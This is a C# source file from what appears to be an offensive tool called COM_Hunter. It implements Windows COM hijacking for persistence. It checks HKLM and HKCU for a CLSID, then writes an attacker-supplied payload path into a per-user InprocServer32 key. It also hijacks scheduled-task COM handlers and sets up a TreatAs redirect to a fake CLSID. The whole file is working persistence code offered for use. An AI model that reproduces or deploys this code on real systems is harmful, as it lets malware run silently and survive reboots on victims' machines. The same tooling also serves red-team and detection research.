using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;

namespace COM_Hunter
{
    public class Persist
    {
        private string fakeclsid { get; set; } = "Software\\Classes\\CLSID\\{DEADBEEF-BEEF-DEAD-BEEF-DEADBEEFDEAD}\\InprocServer32";
        private string fakeclsidsort { get; set; } = "{DEADBEEF-BEEF-DEAD-BEEF-DEADBEEFDEAD}";
        public void PersisterGeneral(string argument1, string argument2)
        {
            //Try to find out the arguments types
            var payloadChecker = new Payload();

            //Return Values from the method
            List<string> argumentsList = payloadChecker.FileChecker(argument1, argument2);
            string payload = argumentsList.ElementAt(0);
            string clsid = argumentsList.ElementAt(1);

            //Try to find out if payload exist in this system
            payloadChecker.FileTypeChecker(payload);

            //CLSID trimmer
            string newclsid = payloadChecker.ClsidChecker(clsid);

            //Call method SearchRegistryLM
            SearchRegistryLM(newclsid);

            //Call method SearchRegistryCU
            SearchRegistryCU(newclsid);

            //Call method CreateRegistryCU
            CreateRegistryCU(newclsid, payload);
        }

        public void PersisterTaskSch(string payload)
        {
            //Try to check if payload exists in system
            var payloadChecker = new Payload();
            payloadChecker.FileTypeChecker(payload);

            //Convert list to string
            string tasksch = string.Join(Environment.NewLine, Storage.Tasksch.ToArray());

            //Call method SearchRegistryLM
            SearchRegistryLM(tasksch);

            //Call method SearchRegistryCU
            SearchRegistryCU(tasksch);

            //Call method CreateRegistryCU
            CreateRegistryCU(tasksch, payload);
        }

        public void PersisterTreatAs(string argument1, string argument2)
        {
            //Try to find out the arguments types
            var payloadChecker = new Payload();

            //Return Values from the method
            List<string> argumentsList = payloadChecker.FileChecker(argument1, argument2);
            string payload = argumentsList.ElementAt(0);
            string clsid = argumentsList.ElementAt(1);

            //Try to find out if payload exist in this system
            payloadChecker.FileTypeChecker(payload);

            //CLSID trimmer
            string newclsid = payloadChecker.ClsidChecker(clsid);

            //Call method SearchRegistryLM
            SearchRegistryLM(newclsid);

            //Call method SearchRegistryCU
            SearchRegistryCU(newclsid);

            //Call method CreateRegistryCUTreatAs
            CreateRegistryCUTreatAS(newclsid, fakeclsid, fakeclsidsort, payload);

        }

        private void SearchRegistryLM(string registryKey)
        {
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(registryKey, false);
            if (key == null)
            {
                Info.ErrorMsg2();
                Settings.ExitCodeMethodError();
            }
        }

        private void SearchRegistryCU(string registryKey)
        {
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(registryKey, false);
            if (key != null)
            {
                Info.ErrorMsg3();
                Settings.ExitCodeMethodError();
            }
        }

        private void CreateRegistryCU(string registryKey, string payload)
        {
            string registryKeyLow = registryKey.ToLower();
            if (!registryKeyLow.Contains("inprocserver32"))
            {
                registryKey = registryKey + "\\" + "InprocServer32";
            }
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).CreateSubKey(registryKey, true);
            key.SetValue("", payload);
            key.SetValue("ThreadingModel", "Both");
            key.Close();

            //Show Success Message
            Info.SuccessMsg();
        }

        private void CreateRegistryCUTreatAS(string registryKey, string fakeclsid, string fakeclsidsort, string payload)
        {
            string registryKeyLow = registryKey.ToLower();
            if (!registryKeyLow.Contains("treatas"))
            {
                registryKey = registryKey + "\\" + "TreatAs";
            }
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).CreateSubKey(registryKey, true);
            key.SetValue("", fakeclsidsort);
            key.Close();

            RegistryKey key1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).CreateSubKey(fakeclsid, true);
            key1.SetValue("", payload);
            key1.SetValue("ThreadingModel", "Both");
            key1.Close();

            //Show Success Message
            Info.SuccessMsg();
        }
    }
}
